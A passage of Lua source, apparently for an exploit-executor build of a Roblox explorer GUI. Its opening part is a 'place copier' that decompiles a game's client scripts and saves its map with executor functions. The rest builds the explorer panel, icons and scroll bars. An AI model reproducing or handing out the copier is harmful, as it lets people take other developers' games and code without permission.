	obj.Visible = true
	obj.Parent = SaveMapSettingFrame
	
	if defaultOn then
		toggle(true)
	end
end

function createCopyWhatSetting(serv)
	if SaveMapSettings.CopyWhat[serv] then
		local newSetting = SaveMapCopyTemplate:Clone()
		newSetting.Position = UDim2.new(0,0,0,#SaveMapCopyList:GetChildren() * 22 + 5)
		newSetting.Info.Text = serv
		
		local function toggle(on)
			if on then
				newSetting.Change.enabled.Visible = true
				SaveMapSettings.CopyWhat[serv] = true
			else
				newSetting.Change.enabled.Visible = false
				SaveMapSettings.CopyWhat[serv] = false
			end
		end	
	
		newSetting.Change.MouseButton1Click:connect(function()
			toggle(not SaveMapSettings.CopyWhat[serv])
		end)
		
		newSetting.Visible = true
		newSetting.Parent = SaveMapCopyList
	end
end

createMapSetting(SaveMapSettingFrame.Scripts,"SaveScripts",true)
createMapSetting(SaveMapSettingFrame.Terrain,"SaveTerrain",true)
createMapSetting(SaveMapSettingFrame.Lighting,"LightingProperties",true)
createMapSetting(SaveMapSettingFrame.CameraInstances,"CameraInstances",true)

createCopyWhatSetting("Workspace")
createCopyWhatSetting("Lighting")
createCopyWhatSetting("ReplicatedStorage")
createCopyWhatSetting("ReplicatedFirst")
createCopyWhatSetting("StarterPack")
createCopyWhatSetting("StarterGui")
createCopyWhatSetting("StarterPlayer")

SaveMapName.Text = tostring(game.PlaceId).."MapCopy"

SaveMapButton.MouseButton1Click:connect(function()
	local copyWhat = {}

	local copyGroup = Instance.new("Model",game:GetService'ReplicatedStorage')

	local copyScripts = SaveMapSettings.SaveScripts

	local copyTerrain = SaveMapSettings.SaveTerrain

	local lightingProperties = SaveMapSettings.LightingProperties

	local cameraInstances = SaveMapSettings.CameraInstances

	-----------------------------------------------------------------------------------

	for i,v in pairs(SaveMapSettings.CopyWhat) do
		if v then
			table.insert(copyWhat,i)
		end
	end

	local consoleFunc = printconsole or writeconsole

	if consoleFunc then
		consoleFunc("Raspberry Pi's place copier loaded.")
		consoleFunc("Copying map of game "..tostring(game.PlaceId)..".")
	end

	function archivable(root)
		for i,v in pairs(root:GetChildren()) do
			if not game:GetService'Players':GetPlayerFromCharacter(v) then
				v.Archivable = true
				archivable(v)
			end
		end
	end

	function decompileS(root)
		for i,v in pairs(root:GetChildren()) do
			pcall(function()
				if v:IsA("LocalScript") then
					local isDisabled = v.Disabled
					v.Disabled = true
					v.Source = decompile(v)
					v.Disabled = isDisabled
				
					if v.Source == "" then 
						if consoleFunc then consoleFunc("LocalScript "..v.Name.." had a problem decompiling.") end
					else
						if consoleFunc then consoleFunc("LocalScript "..v.Name.." decompiled.") end
					end
				elseif v:IsA("ModuleScript") then
					v.Source = decompile(v)
				
					if v.Source == "" then 
						if consoleFunc then consoleFunc("ModuleScript "..v.Name.." had a problem decompiling.") end
					else
						if consoleFunc then consoleFunc("ModuleScript "..v.Name.." decompiled.") end
					end
				end
			end)
			decompileS(v)
		end
	end

	for i,v in pairs(copyWhat) do archivable(game[v]) end

	for j,obj in pairs(copyWhat) do
		if obj ~= "StarterPlayer" then
			local newFolder = Instance.new("Folder",copyGroup)
			newFolder.Name = obj
			for i,v in pairs(game[obj]:GetChildren()) do
				if v ~= copyGroup then
					pcall(function()
						v:Clone().Parent = newFolder
					end)
				end
			end
		else
			local newFolder = Instance.new("Model",copyGroup)
			newFolder.Name = "StarterPlayer"
			for i,v in pairs(game[obj]:GetChildren()) do
				local newObj = Instance.new("Folder",newFolder)
				newObj.Name = v.Name
				for _,c in pairs(v:GetChildren()) do
					if c.Name ~= "ControlScript" and c.Name ~= "CameraScript" then
						c:Clone().Parent = newObj
					end
				end
			end
		end
	end

	if workspace.CurrentCamera and cameraInstances then
		local cameraFolder = Instance.new("Model",copyGroup)
		cameraFolder.Name = "CameraItems"
		for i,v in pairs(workspace.CurrentCamera:GetChildren()) do v:Clone().Parent = cameraFolder end
	end

	if copyTerrain then
		local myTerrain = workspace.Terrain:CopyRegion(workspace.Terrain.MaxExtents)
		myTerrain.Parent = copyGroup
	end

	function saveProp(obj,prop,par)
		local myProp = obj[prop]
		if type(myProp) == "boolean" then
			local newProp = Instance.new("BoolValue",par)
			newProp.Name = prop
			newProp.Value = myProp
		elseif type(myProp) == "number" then
			local newProp = Instance.new("IntValue",par)
			newProp.Name = prop
			newProp.Value = myProp
		elseif type(myProp) == "string" then
			local newProp = Instance.new("StringValue",par)
			newProp.Name = prop
			newProp.Value = myProp
		elseif type(myProp) == "userdata" then -- Assume Color3
			pcall(function()
				local newProp = Instance.new("Color3Value",par)
				newProp.Name = prop
				newProp.Value = myProp
			end)
		end
	end

	if lightingProperties then
		local lightingProps = Instance.new("Model",copyGroup)
		lightingProps.Name = "LightingProperties"
	
		saveProp(game:GetService'Lighting',"Ambient",lightingProps)
		saveProp(game:GetService'Lighting',"Brightness",lightingProps)
		saveProp(game:GetService'Lighting',"ColorShift_Bottom",lightingProps)
		saveProp(game:GetService'Lighting',"ColorShift_Top",lightingProps)
		saveProp(game:GetService'Lighting',"GlobalShadows",lightingProps)
		saveProp(game:GetService'Lighting',"OutdoorAmbient",lightingProps)
		saveProp(game:GetService'Lighting',"Outlines",lightingProps)
		saveProp(game:GetService'Lighting',"GeographicLatitude",lightingProps)
		saveProp(game:GetService'Lighting',"TimeOfDay",lightingProps)
		saveProp(game:GetService'Lighting',"FogColor",lightingProps)
		saveProp(game:GetService'Lighting',"FogEnd",lightingProps)
		saveProp(game:GetService'Lighting',"FogStart",lightingProps)
	end

	if decompile and copyScripts then
		decompileS(copyGroup)
	end

	if SaveInstance then
		SaveInstance(copyGroup,SaveMapName.Text..".rbxm")
	elseif saveinstance then
		saveinstance(SaveMapName.Text..".rbxm", copyGroup)
	end
	--print("Saved!")
	if consoleFunc then
		consoleFunc("The map has been copied.")
	end
	SaveMapButton.Text = "The map has been saved"
	wait(5)
	SaveMapButton.Text = "Save"
end)

-- End Copier

wait()

IntroFrame:TweenPosition(UDim2.new(1,-300,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)

switchWindows("Explorer")

wait(1)

SideMenu.Visible = true

for i = 0,1,0.1 do
	IntroFrame.BackgroundTransparency = i
	IntroFrame.Main.BackgroundTransparency = i
	IntroFrame.Slant.ImageLabel.ImageTransparency = i
	IntroFrame.Title.ImageTransparency = i
	IntroFrame.Version.TextTransparency = i
	IntroFrame.Creator.TextTransparency = i
	wait()
end

IntroFrame.Visible = false

SlideFrame:TweenPosition(UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
OpenScriptEditorButton:TweenPosition(UDim2.new(0,0,0,150),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
CloseToggleButton:TweenPosition(UDim2.new(0,0,0,180),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
Slant:TweenPosition(UDim2.new(0,0,0,210),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)

wait(0.5)

for i = 1,0,-0.1 do
	OpenScriptEditorButton.Icon.ImageTransparency = i
	CloseToggleButton.TextTransparency = i
	wait()
end

CloseToggleButton.Active = true

OpenScriptEditorButton.Active = true
end)
spawn(function()
	-- initial states
local Option = {
	-- can modify object parents in the hierarchy
	Modifiable = false;
	-- can select objects
	Selectable = true;
}

-- MERELY

Option.Modifiable = true

-- END MERELY

-- general size of GUI objects, in pixels
local GUI_SIZE = 16
-- padding between items within each entry
local ENTRY_PADDING = 1
-- padding between each entry
local ENTRY_MARGIN = 1

local Input = game:GetService("UserInputService")
local HoldingCtrl = false
local HoldingShift = false

--[[

# Explorer Panel

A GUI panel that displays the game hierarchy.


## Selection Bindables

- `Function GetSelection ( )`

	Returns an array of objects representing the objects currently
	selected in the panel.

- `Function SetSelection ( Objects selection )`

	Sets the objects that are selected in the panel. `selection` is an array
	of objects.

- `Event SelectionChanged ( )`

	Fired after the selection changes.


## Option Bindables

- `Function GetOption ( string optionName )`

	If `optionName` is given, returns the value of that option. Otherwise,
	returns a table of options and their current values.

- `Function SetOption ( string optionName, bool value )`

	Sets `optionName` to `value`.

	Options:

	- Modifiable

		Whether objects can be modified by the panel.

		Note that modifying objects depends on being able to select them. If
		Selectable is false, then Actions will not be available. Reparenting
		is still possible, but only for the dragged object.

	- Selectable

		Whether objects can be selected.

		If Modifiable is false, then left-clicking will perform a drag
		selection.

## Updates

- 2013-09-18
	- Fixed explorer icons to match studio explorer.

- 2013-09-14
	- Added GetOption and SetOption bindables.
		- Option: Modifiable; sets whether objects can be modified by the panel.
		- Option: Selectable; sets whether objects can be selected.
	- Slight modification to left-click selection behavior.
	- Improved layout and scaling.

- 2013-09-13
	- Added drag to reparent objects.
		- Left-click to select/deselect object.
		- Left-click and drag unselected object to reparent single object.
		- Left-click and drag selected object to move reparent entire selection.
		- Right-click while dragging to cancel.

- 2013-09-11
	- Added explorer panel header with actions.
		- Added Cut action.
		- Added Copy action.
		- Added Paste action.
		- Added Delete action.
	- Added drag selection.
		- Left-click: Add to selection on drag.
		- Right-click: Add to or remove from selection on drag.
	- Ensured SelectionChanged fires only when the selection actually changes.
	- Added documentation and change log.
	- Fixed thread issue.

- 2013-09-09
	- Added basic multi-selection.
		- Left-click to set selection.
		- Right-click to add to or remove from selection.
	- Removed "Selection" ObjectValue.
		- Added GetSelection BindableFunction.
		- Added SetSelection BindableFunction.
		- Added SelectionChanged BindableEvent.
	- Changed font to SourceSans.

- 2013-08-31
	- Improved GUI sizing based off of `GUI_SIZE` constant.
	- Automatic font size detection.

- 2013-08-27
	- Initial explorer panel.


## Todo

- Sorting
	- by ExplorerOrder
	- by children
	- by name
- Drag objects to reparent

]]

local ENTRY_SIZE = GUI_SIZE + ENTRY_PADDING*2
local ENTRY_BOUND = ENTRY_SIZE + ENTRY_MARGIN
local HEADER_SIZE = ENTRY_SIZE*2

local FONT = 'SourceSans'
local FONT_SIZE do
	local size = {8,9,10,11,12,14,18,24,36,48}
	local s
	local n = math.huge
	for i = 1,#size do
		if size[i] <= GUI_SIZE then
			FONT_SIZE = i - 1
		end
	end
end

local GuiColor = {
	Background      = Color3.fromRGB( 43,  43,  43);
	Border          = Color3.fromRGB( 20,  20,  20);
	Selected        = Color3.fromRGB( 197, 28, 70);
	BorderSelected  = Color3.fromRGB( 170, 82, 104);
	Text            = Color3.fromRGB(245, 245, 245);
	TextDisabled    = Color3.fromRGB(188, 188, 188);
	TextSelected    = Color3.fromRGB(255, 255, 255);
	Button          = Color3.fromRGB( 33,  33,  33);
	ButtonBorder    = Color3.fromRGB(133, 133, 133);
	ButtonSelected  = Color3.fromRGB( 250, 51, 101);
	Field           = Color3.fromRGB( 43,  43,  43);
	FieldBorder     = Color3.fromRGB( 50,  50,  50);
	TitleBackground = Color3.fromRGB( 11,  11,  11);
}

--[[
Background      = Color3.fromRGB(233, 233, 233);
Border          = Color3.fromRGB(149, 149, 149);
Selected        = Color3.fromRGB( 96, 140, 211);
BorderSelected  = Color3.fromRGB( 86, 125, 188);
Text            = Color3.fromRGB(  0,   0,   0);
TextDisabled    = Color3.fromRGB(128, 128, 128);
TextSelected    = Color3.fromRGB(255, 255, 255);
Button          = Color3.fromRGB(221, 221, 221);
ButtonBorder    = Color3.fromRGB(149, 149, 149);
ButtonSelected  = Color3.fromRGB(255,   0,   0);
Field           = Color3.fromRGB(255, 255, 255);
FieldBorder     = Color3.fromRGB(191, 191, 191);
TitleBackground = Color3.fromRGB(178, 178, 178);
]]

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- Icon map constants

local MAP_ID = 483448923

-- Indices based on implementation of Icon function.
local ACTION_CUT         	 = 160
local ACTION_COPY        	 = 161
local ACTION_PASTE       	 = 162
local ACTION_DELETE      	 = 163
local ACTION_SORT        	 = 164
local ACTION_CUT_OVER    	 = 174
local ACTION_COPY_OVER   	 = 175
local ACTION_PASTE_OVER  	 = 176
local ACTION_DELETE_OVER	 = 177
local ACTION_SORT_OVER  	 = 178
local ACTION_EDITQUICKACCESS = 190
local ACTION_FREEZE 		 = 188
local ACTION_STARRED 		 = 189
local ACTION_ADDSTAR 		 = 184
local ACTION_ADDSTAR_OVER 	 = 187

local NODE_COLLAPSED      = 165
local NODE_EXPANDED       = 166
local NODE_COLLAPSED_OVER = 179
local NODE_EXPANDED_OVER  = 180

local ExplorerIndex = {
	["Accessory"] = 32;
	["Accoutrement"] = 32;
	["AdService"] = 73;
	["Animation"] = 60;
	["AnimationController"] = 60;
	["AnimationTrack"] = 60;
	["Animator"] = 60;
	["ArcHandles"] = 56;
	["AssetService"] = 72;
	["Attachment"] = 34;
	["Backpack"] = 20;
	["BadgeService"] = 75;
	["BallSocketConstraint"] = 89;
	["BillboardGui"] = 64;
	["BinaryStringValue"] = 4;
	["BindableEvent"] = 67;
	["BindableFunction"] = 66;
	["BlockMesh"] = 8;
	["BloomEffect"] = 90;
	["BlurEffect"] = 90;
	["BodyAngularVelocity"] = 14;
	["BodyForce"] = 14;
	["BodyGyro"] = 14;
	["BodyPosition"] = 14;
	["BodyThrust"] = 14;
	["BodyVelocity"] = 14;
	["BoolValue"] = 4;
	["BoxHandleAdornment"] = 54;
	["BrickColorValue"] = 4;
	["Camera"] = 5;
	["CFrameValue"] = 4;
	["CharacterMesh"] = 60;
	["Chat"] = 33;
	["ClickDetector"] = 41;
	["CollectionService"] = 30;
	["Color3Value"] = 4;
	["ColorCorrectionEffect"] = 90;
	["ConeHandleAdornment"] = 54;
	["Configuration"] = 58;
	["ContentProvider"] = 72;
	["ContextActionService"] = 41;
	["CoreGui"] = 46;
	["CoreScript"] = 18;
	["CornerWedgePart"] = 1;
	["CustomEvent"] = 4;
	["CustomEventReceiver"] = 4;
	["CylinderHandleAdornment"] = 54;
	["CylinderMesh"] = 8;
	["CylindricalConstraint"] = 89;
	["Debris"] = 30;
	["Decal"] = 7;
	["Dialog"] = 62;
	["DialogChoice"] = 63;
	["DoubleConstrainedValue"] = 4;
	["Explosion"] = 36;
	["FileMesh"] = 8;
	["Fire"] = 61;
	["Flag"] = 38;
	["FlagStand"] = 39;
	["FloorWire"] = 4;
	["Folder"] = 70;
	["ForceField"] = 37;
	["Frame"] = 48;
	["GamePassService"] = 19;
	["Glue"] = 34;
	["GuiButton"] = 52;
	["GuiMain"] = 47;
	["GuiService"] = 47;
	["Handles"] = 53;
	["HapticService"] = 84;
	["Hat"] = 45;
	["HingeConstraint"] = 89;
	["Hint"] = 33;
	["HopperBin"] = 22;
	["HttpService"] = 76;
	["Humanoid"] = 9;
	["ImageButton"] = 52;
	["ImageLabel"] = 49;
	["InsertService"] = 72;
	["IntConstrainedValue"] = 4;
	["IntValue"] = 4;
	["JointInstance"] = 34;
	["JointsService"] = 34;
	["Keyframe"] = 60;
	["KeyframeSequence"] = 60;
	["KeyframeSequenceProvider"] = 60;
	["Lighting"] = 13;
	["LineHandleAdornment"] = 54;
	["LocalScript"] = 18;
	["LogService"] = 87;
	["MarketplaceService"] = 46;
	["Message"] = 33;
	["Model"] = 2;
	["ModuleScript"] = 71;
	["Motor"] = 34;
	["Motor6D"] = 34;
	["MoveToConstraint"] = 89;
	["NegateOperation"] = 78;
	["NetworkClient"] = 16;
	["NetworkReplicator"] = 29;
	["NetworkServer"] = 15;
	["NumberValue"] = 4;
	["ObjectValue"] = 4;
	["Pants"] = 44;
	["ParallelRampPart"] = 1;
	["Part"] = 1;
	["ParticleEmitter"] = 69;
	["PartPairLasso"] = 57;
	["PathfindingService"] = 37;
	["Platform"] = 35;
	["Player"] = 12;
	["PlayerGui"] = 46;
	["Players"] = 21;
	["PlayerScripts"] = 82;
	["PointLight"] = 13;
	["PointsService"] = 83;
	["Pose"] = 60;
	["PrismaticConstraint"] = 89;
	["PrismPart"] = 1;
	["PyramidPart"] = 1;
	["RayValue"] = 4;
	["ReflectionMetadata"] = 86;
	["ReflectionMetadataCallbacks"] = 86;
	["ReflectionMetadataClass"] = 86;
	["ReflectionMetadataClasses"] = 86;
	["ReflectionMetadataEnum"] = 86;
	["ReflectionMetadataEnumItem"] = 86;
	["ReflectionMetadataEnums"] = 86;
	["ReflectionMetadataEvents"] = 86;
	["ReflectionMetadataFunctions"] = 86;
	["ReflectionMetadataMember"] = 86;
	["ReflectionMetadataProperties"] = 86;
	["ReflectionMetadataYieldFunctions"] = 86;
	["RemoteEvent"] = 80;
	["RemoteFunction"] = 79;
	["ReplicatedFirst"] = 72;
	["ReplicatedStorage"] = 72;
	["RightAngleRampPart"] = 1;
	["RocketPropulsion"] = 14;
	["RodConstraint"] = 89;
	["RopeConstraint"] = 89;
	["Rotate"] = 34;
	["RotateP"] = 34;
	["RotateV"] = 34;
	["RunService"] = 66;
	["ScreenGui"] = 47;
	["Script"] = 6;
	["ScrollingFrame"] = 48;
	["Seat"] = 35;
	["Selection"] = 55;
	["SelectionBox"] = 54;
	["SelectionPartLasso"] = 57;
	["SelectionPointLasso"] = 57;
	["SelectionSphere"] = 54;
	["ServerScriptService"] = 0;
	["Shirt"] = 43;
	["ShirtGraphic"] = 40;
	["SkateboardPlatform"] = 35;
	["Sky"] = 28;
	["SlidingBallConstraint"] = 89;
	["Smoke"] = 59;
	["Snap"] = 34;
	["Sound"] = 11;
	["SoundService"] = 31;
	["Sparkles"] = 42;
	["SpawnLocation"] = 25;
	["SpecialMesh"] = 8;
	["SphereHandleAdornment"] = 54;
	["SpotLight"] = 13;
	["SpringConstraint"] = 89;
	["StarterCharacterScripts"] = 82;
	["StarterGear"] = 20;
	["StarterGui"] = 46;
	["StarterPack"] = 20;
	["StarterPlayer"] = 88;
	["StarterPlayerScripts"] = 82;
	["Status"] = 2;
	["StringValue"] = 4;
	["SunRaysEffect"] = 90;
	["SurfaceGui"] = 64;
	["SurfaceLight"] = 13;
	["SurfaceSelection"] = 55;
	["Team"] = 24;
	["Teams"] = 23;
	["TeleportService"] = 81;
	["Terrain"] = 65;
	["TerrainRegion"] = 65;
	["TestService"] = 68;
	["TextBox"] = 51;
	["TextButton"] = 51;
	["TextLabel"] = 50;
	["Texture"] = 10;
	["TextureTrail"] = 4;
	["Tool"] = 17;
	["TouchTransmitter"] = 37;
	["TrussPart"] = 1;
	["UnionOperation"] = 77;
	["UserInputService"] = 84;
	["Vector3Value"] = 4;
	["VehicleSeat"] = 35;
	["VelocityMotor"] = 34;
	["WedgePart"] = 1;
	["Weld"] = 34;
	["Workspace"] = 19;
}

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------

function Create(ty,data)
	local obj
	if type(ty) == 'string' then
		obj = Instance.new(ty)
	else
		obj = ty
	end
	for k, v in pairs(data) do
		if type(k) == 'number' then
			v.Parent = obj
		else
			obj[k] = v
		end
	end
	return obj
end

local barActive = false
local activeOptions = {}

function createDDown(dBut, callback,...)
	if barActive then
		for i,v in pairs(activeOptions) do
			v:Destroy()
		end
		activeOptions = {}
		barActive = false
		return
	else
		barActive = true
	end
	local slots = {...}
	local base = dBut
	for i,v in pairs(slots) do
		local newOption = base:Clone()
		newOption.ZIndex = 5
		newOption.Name = "Option "..tostring(i)
		newOption.Parent = base.Parent.Parent.Parent
		newOption.BackgroundTransparency = 0
		newOption.ZIndex = 2
		table.insert(activeOptions,newOption)
		newOption.Position = UDim2.new(-0.4, dBut.Position.X.Offset, dBut.Position.Y.Scale, dBut.Position.Y.Offset + (#activeOptions * dBut.Size.Y.Offset))
		newOption.Text = slots[i]
		newOption.MouseButton1Down:connect(function()
			dBut.Text = slots[i]
			callback(slots[i])
			for i,v in pairs(activeOptions) do
				v:Destroy()
			end
			activeOptions = {}
			barActive = false
		end)
	end
end

-- Connects a function to an event such that it fires asynchronously
function Connect(event,func)
	return event:connect(function(...)
		local a = {...}
		spawn(function() func(unpack(a)) end)
	end)
end

-- returns the ascendant ScreenGui of an object
function GetScreen(screen)
	if screen == nil then return nil end
	while not screen:IsA("ScreenGui") do
		screen = screen.Parent
		if screen == nil then return nil end
	end
	return screen
end

do
	local ZIndexLock = {}
	-- Sets the ZIndex of an object and its descendants. Objects are locked so
	-- that SetZIndexOnChanged doesn't spawn multiple threads that set the
	-- ZIndex of the same object.
	function SetZIndex(object,z)
		if not ZIndexLock[object] then
			ZIndexLock[object] = true
			if object:IsA'GuiObject' then
				object.ZIndex = z
			end
			local children = object:GetChildren()
			for i = 1,#children do
				SetZIndex(children[i],z)
			end
			ZIndexLock[object] = nil
		end
	end

	function SetZIndexOnChanged(object)
		return object.Changed:connect(function(p)
			if p == "ZIndex" then
				SetZIndex(object,object.ZIndex)
			end
		end)
	end
end

---- IconMap ----
-- Image size: 256px x 256px
-- Icon size: 16px x 16px
-- Padding between each icon: 2px
-- Padding around image edge: 1px
-- Total icons: 14 x 14 (196)
local Icon do
	local iconMap = 'http://www.roblox.com/asset/?id=' .. MAP_ID
	game:GetService('ContentProvider'):Preload(iconMap)
	local iconDehash do
		-- 14 x 14, 0-based input, 0-based output
		local f=math.floor
		function iconDehash(h)
			return f(h/14%14),f(h%14)
		end
	end

	function Icon(IconFrame,index,abc)
		local row,col = iconDehash(index)
		local mapSize = Vector2.new(256,256)
		local pad,border = 2,1
		local iconSize = 16

		local class = 'Frame'
		if type(IconFrame) == 'string' then
			class = IconFrame
			IconFrame = nil
		end

        if not IconFrame then
			IconFrame = Create(class,{
				Name = "Icon";
				BackgroundTransparency = 1;
                ClipsDescendants = true;
				Create('ImageLabel',{
					Name = "IconMap";
					Active = false;
                    BackgroundTransparency = 1;
					Image = iconMap;
					Size = UDim2.new(mapSize.x/iconSize,0,mapSize.y/iconSize,0);
				});
			})
		end
        if IconFrame:IsA'GuiButton' then
            IconFrame.AutoButtonColor = not abc;
        end
		IconFrame.IconMap.Position = UDim2.new(-col - (pad*(col+1) + border)/iconSize,0,-row - (pad*(row+1) + border)/iconSize,0)
		return IconFrame
	end
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- ScrollBar
do
	-- AutoButtonColor doesn't always reset properly
	local function ResetButtonColor(button)
		local active = button.Active
		button.Active = not active
		button.Active = active
	end

	local function ArrowGraphic(size,dir,scaled,template)
		local Frame = Create('Frame',{
			Name = "Arrow Graphic";
			BorderSizePixel = 0;
			Size = UDim2.new(0,size,0,size);
			Transparency = 1;
		})
		if not template then
			template = Instance.new("Frame")
			template.BorderSizePixel = 0
		end

		template.BackgroundColor3 = Color3.new(1, 1, 1);

		local transform
		if dir == nil or dir == 'Up' then
			function transform(p,s) return p,s end
		elseif dir == 'Down' then
			function transform(p,s) return UDim2.new(0,p.X.Offset,0,size-p.Y.Offset-1),s end
		elseif dir == 'Left' then
			function transform(p,s) return UDim2.new(0,p.Y.Offset,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
		elseif dir == 'Right' then
			function transform(p,s) return UDim2.new(0,size-p.Y.Offset-1,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
		end

		local scale
		if scaled then
			function scale(p,s) return UDim2.new(p.X.Offset/size,0,p.Y.Offset/size,0),UDim2.new(s.X.Offset/size,0,s.Y.Offset/size,0) end
		else
			function scale(p,s) return p,s end
		end

		local o = math.floor(size/4)
		if size%2 == 0 then
			local n = size/2-1
			for i = 0,n do
				local t = template:Clone()
				local p,s = scale(transform(
					UDim2.new(0,n-i,0,o+i),
					UDim2.new(0,(i+1)*2,0,1)
				))
				t.Position = p
				t.Size = s
				t.Parent = Frame
			end
		else
			local n = (size-1)/2
			for i = 0,n do
				local t = template:Clone()
				local p,s = scale(transform(
					UDim2.new(0,n-i,0,o+i),
					UDim2.new(0,i*2+1,0,1)
				))
				t.Position = p
				t.Size = s
				t.Parent = Frame
			end
		end
		if size%4 > 1 then
			local t = template:Clone()
			local p,s = scale(transform(
				UDim2.new(0,0,0,size-o-1),
				UDim2.new(0,size,0,1)
			))
			t.Position = p
			t.Size = s
			t.Parent = Frame
		end

		for i,v in pairs(Frame:GetChildren()) do
			v.BackgroundColor3 = Color3.new(1, 1, 1);
		end

		return Frame
	end


	local function GripGraphic(size,dir,spacing,scaled,template)
		local Frame = Create('Frame',{
			Name = "Grip Graphic";
			BorderSizePixel = 0;
			Size = UDim2.new(0,size.x,0,size.y);
			Transparency = 1;
		})
		if not template then
			template = Instance.new("Frame")
			template.BorderSizePixel = 0
		end

		spacing = spacing or 2

		local scale
		if scaled then
			function scale(p) return UDim2.new(p.X.Offset/size.x,0,p.Y.Offset/size.y,0) end
		else
			function scale(p) return p end
		end

		if dir == 'Vertical' then
			for i=0,size.x-1,spacing do
				local t = template:Clone()
				t.Size = scale(UDim2.new(0,1,0,size.y))
				t.Position = scale(UDim2.new(0,i,0,0))
				t.Parent = Frame
			end
		elseif dir == nil or dir == 'Horizontal' then
			for i=0,size.y-1,spacing do
				local t = template:Clone()
				t.Size = scale(UDim2.new(0,size.x,0,1))
				t.Position = scale(UDim2.new(0,0,0,i))
				t.Parent = Frame
			end
		end

		return Frame
	end

	local mt = {
		__index = {
			GetScrollPercent = function(self)
				return self.ScrollIndex/(self.TotalSpace-self.VisibleSpace)
			end;
			CanScrollDown = function(self)
				return self.ScrollIndex + self.VisibleSpace < self.TotalSpace
			end;
			CanScrollUp = function(self)
				return self.ScrollIndex > 0
			end;
			ScrollDown = function(self)
				self.ScrollIndex = self.ScrollIndex + self.PageIncrement
				self:Update()
			end;
			ScrollUp = function(self)
				self.ScrollIndex = self.ScrollIndex - self.PageIncrement
				self:Update()
			end;
			ScrollTo = function(self,index)
				self.ScrollIndex = index
				self:Update()
			end;
			SetScrollPercent = function(self,percent)
				self.ScrollIndex = math.floor((self.TotalSpace - self.VisibleSpace)*percent + 0.5)
				self:Update()
			end;
		};
	}
	mt.__index.CanScrollRight = mt.__index.CanScrollDown
	mt.__index.CanScrollLeft = mt.__index.CanScrollUp
	mt.__index.ScrollLeft = mt.__index.ScrollUp
	mt.__index.ScrollRight = mt.__index.ScrollDown

	local ScrollStyles = {
		Background      = Color3.fromRGB(233, 233, 233);
		Border          = Color3.fromRGB(149, 149, 149);
		Selected        = Color3.fromRGB( 63, 119, 189);
		BorderSelected  = Color3.fromRGB( 55, 106, 167);
		Text            = Color3.fromRGB(  0,   0,   0);
		TextDisabled    = Color3.fromRGB(128, 128, 128);
		TextSelected    = Color3.fromRGB(255, 255, 255);
		Button          = Color3.fromRGB( 35,  35,  35);
		ButtonBorder    = Color3.fromRGB(149, 149, 149);
		ButtonSelected  = Color3.fromRGB(255,   0,   0);
		Field           = Color3.fromRGB(255, 255, 255);
		FieldBorder     = Color3.fromRGB(191, 191, 191);
		TitleBackground = Color3.fromRGB(178, 178, 178);
	}

	function ScrollBar(horizontal)
		-- create row scroll bar
		local ScrollBarWidth = GUI_SIZE;
		local ScrollFrame = Create('Frame',{
			Name = "ScrollFrame";
			Position = horizontal and UDim2.new(0,0,1,-ScrollBarWidth) or UDim2.new(1,-ScrollBarWidth,0,0);
			Size = horizontal and UDim2.new(1,0,0,ScrollBarWidth) or UDim2.new(0,ScrollBarWidth,1,0);
			BackgroundTransparency = 1;
			Create('ImageButton',{
				Name = "ScrollDown";
				Position = horizontal and UDim2.new(1,-ScrollBarWidth,0,0) or UDim2.new(0,0,1,-ScrollBarWidth);
				Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
				BackgroundColor3 = ScrollStyles.Button;
				BorderColor3 = ScrollStyles.Border;
				BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollUp";
				Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
				BackgroundColor3 = ScrollStyles.Button;
				BorderColor3 = ScrollStyles.Border;
				BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollBar";
				Size = horizontal and UDim2.new(1,-ScrollBarWidth*2,1,0) or UDim2.new(1,0,1,-ScrollBarWidth*2);
				Position = horizontal and UDim2.new(0,ScrollBarWidth,0,0) or UDim2.new(0,0,0,ScrollBarWidth);
				AutoButtonColor = false;
				BackgroundColor3 = Color3.fromRGB(20, 20, 20);
				BorderColor3 = ScrollStyles.Border;
				BorderSizePixel = 0;
				Create('ImageButton',{
					Name = "ScrollThumb";
					AutoButtonColor = false;
					Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
					BackgroundColor3 = ScrollStyles.Button;
					BorderColor3 = ScrollStyles.Border;
					BorderSizePixel = 0;
				});
			});
		})

		local graphicTemplate = Create('Frame',{
			Name="Graphic";
			BorderSizePixel = 0;
			BackgroundColor3 = Color3.new(1, 1, 1);
		})
		local graphicSize = GUI_SIZE/2

		local ScrollDownFrame = ScrollFrame.ScrollDown
			local ScrollDownGraphic = ArrowGraphic(graphicSize,horizontal and 'Right' or 'Down',true,graphicTemplate)
			ScrollDownGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollDownGraphic.Parent = ScrollDownFrame
		local ScrollUpFrame = ScrollFrame.ScrollUp
			local ScrollUpGraphic = ArrowGraphic(graphicSize,horizontal and 'Left' or 'Up',true,graphicTemplate)
			ScrollUpGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollUpGraphic.Parent = ScrollUpFrame
		local ScrollBarFrame = ScrollFrame.ScrollBar
		local ScrollThumbFrame = ScrollBarFrame.ScrollThumb
		do
			local size = GUI_SIZE*3/8
			local Decal = GripGraphic(Vector2.new(size,size),horizontal and 'Vertical' or 'Horizontal',2,graphicTemplate)
			Decal.Position = UDim2.new(0.5,-size/2,0.5,-size/2)
			Decal.Parent = ScrollThumbFrame
		end

		local Class = setmetatable({
			GUI = ScrollFrame;
			ScrollIndex = 0;
			VisibleSpace = 0;
